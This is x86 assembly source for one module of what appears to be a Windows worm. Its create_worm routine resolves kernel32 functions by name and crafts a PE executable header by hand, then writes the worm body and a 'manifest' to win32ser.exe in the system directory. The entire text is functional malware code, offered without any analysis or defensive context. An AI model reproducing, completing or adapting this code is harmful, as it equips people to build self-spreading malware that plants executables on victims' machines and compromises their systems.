;Descr:	This gen constructs the worm file (%sysdir%\win32ser.exe)
;
;Type:	GEN_CREATEWORM
;
;INPUT:
;[EBX]	DWORD	size of manifest
;[EBX+4]DWORD	address of manifest
;[EBX+8]DWORD	address of worm
;
;OUTPUT:
;(EAX)	NONE
;

create_worm	Proc
	pushad
	@SEH_SetupFrame	<jmp	cw_seh>

	call	cw_delta
cw_delta:
	pop	ebp

	push	ebx				; * store EBX
	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.DLL
	xchg	eax,ebx

	@pushsz	'CreateFileA'
	push	ebx
	call	edi				;get API addresses
	mov	[ebp + cw_CreateFileA - cw_delta],eax
	@pushsz	'WriteFile'
	push	ebx
	call	edi				; ----- " " -----
	mov	[ebp + cw_WriteFile - cw_delta],eax
	@pushsz	'CloseHandle'
	push	ebx
	call	edi				; ----- " " -----
	mov	[ebp + cw_CloseHandle - cw_delta],eax
	@pushsz	'GetSystemDirectoryA'
	push	ebx
	call	edi				; ----- " " -----

	push	MAX_PATH-14
	call	cw_path
	db	MAX_PATH dup (?)
cw_path:pop	edi
	push	edi
	call	eax				;call GetSystemDirectoryA
	push	edi
	add	edi,eax
	mov	eax,'niw\'
	stosd
	mov	eax,'es23'
	stosd
	mov	eax,'xe.r'
	stosd
	mov	ax,'e'
	stosw
	pop	edi				;EDI = %sysdir%\win32ser.exe
	pop	ebx				; * restore EBX

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	0
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_WRITE
	push	edi
	mov	eax,12345678h
cw_CreateFileA = dword ptr $-4
	call	eax				;create worm file
	inc	eax
	je	cw_seh
	dec	eax
	xchg	eax,esi

	push	0
	call	@cw_bwritten
	dd	?
@cw_bwritten:
	push	cw_end_header-cw_header
	call	@cw_header

cw_header:
db	04Dh,05Ah,050h,000h,002h,000h,000h,000h,004h,000h,00Fh,000h,0FFh,0FFh,000h
db	000h,0B8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,01Ah,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,001h,000h,000h,0BAh,010h,000h,00Eh,01Fh,0B4h,009h,0CDh,021h,0B8h,001h
db	04Ch,0CDh,021h,090h,090h,054h,068h,069h,073h,020h,070h,072h,06Fh,067h,072h
db	061h,06Dh,020h,06Dh,075h,073h,074h,020h,062h,065h,020h,072h,075h,06Eh,020h
db	075h,06Eh,064h,065h,072h,020h,057h,069h,06Eh,033h,032h,00Dh,00Ah,024h,037h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,050h,045h,000h,000h,04Ch,001h,001h,000h,03Ah,02Dh,011h,08Ah,000h,000h
db	000h,000h,000h,000h,000h,000h,0E0h,000h,08Eh,081h,00Bh,001h,002h,019h

cw_codesize	dd	4400h

db	000h,000h,000h,000h,000h,000h,000h,000h,000h,010h,000h,000h,000h,010h,000h
db	000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,010h,000h,000h,000h,002h
db	000h,000h,001h,000h,000h,000h,000h,000h,000h,000h,003h,000h,00Ah,000h,000h
db	000h,000h,000h

cw_imagesize	dd	0C000h

db	000h,004h,000h,000h,000h,000h,000h,000h,002h,000h,000h,000h,000h,000h,010h
db	000h,000h,020h,000h,000h,000h,000h,010h,000h,000h,010h,000h,000h,000h,000h
db	000h,000h,010h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,043h
db	04Fh,044h,045h,000h,000h,000h,000h

cw_virtualsize		dd	0B000h
			dd	1000h
cw_sizeofrawdata	dd	4400h
			dd	600h
			dd	0,0,0,0E0000020h

cw_nullz		db	600h-220h dup (?)


cw_end_header:
@cw_header:
	mov	eax,[ebx]
	add	eax,MANIFEST-Start
						;EAX = worm length + manifest length
	mov	ecx,200h
	cdq
	div	ecx
	test	edx,edx
	je	cw_o1
	inc	eax
cw_o1:	mul	ecx

	mov	edi,eax
	mov	[ebp + cw_sizeofrawdata - cw_delta],eax	;correct SH_SizeOfRawData field
	mov	[ebp + cw_codesize - cw_delta],eax	;correct OH_SizeOfCode field
	mov	ecx,1000h
	div	ecx
	test	edx,edx
	je	cw_o2
	inc	eax
cw_o2:	mul	ecx
	mov	[ebp + cw_virtualsize - cw_delta],eax	;correct SH_VirtualSize field
	add	eax,1000h
	mov	[ebp + cw_imagesize - cw_delta],eax	;correct OH_SizeOfImage field

	push	esi
	mov	eax,12345678h
cw_WriteFile = dword ptr $-4
	call	eax					;write PE header

	push	0
	lea	eax,[ebp + @cw_bwritten-5 - cw_delta]
	push	eax
	mov	eax,MANIFEST-Start
	push	eax
	sub	edi,eax
	push	dword ptr [ebx+8]
	push	esi
	call	[ebp + cw_WriteFile - cw_delta]		;write worm code

	push	0
	lea	eax,[ebp + @cw_bwritten-5 - cw_delta]
	push	eax
	mov	eax,[ebx]
	sub	edi,eax
	push	eax
	push	dword ptr [ebx+4]
	push	esi
	call	[ebp + cw_WriteFile - cw_delta]		;write worm manifest

	push	0
	lea	eax,[ebp + @cw_bwritten-5 - cw_delta]
	push	eax
	push	edi
	lea	eax,[ebp + cw_nullz - cw_delta]
	push	eax
	push	esi
	call	[ebp + cw_WriteFile - cw_delta]		;write NULL padding

cw_close:
	push	esi
	mov	eax,12345678h
cw_CloseHandle = dword ptr $-4
	call	eax					;close file

cw_seh:	@SEH_RemoveFrame
	popad
	ret						;and quit
end_create_worm:
create_worm	EndP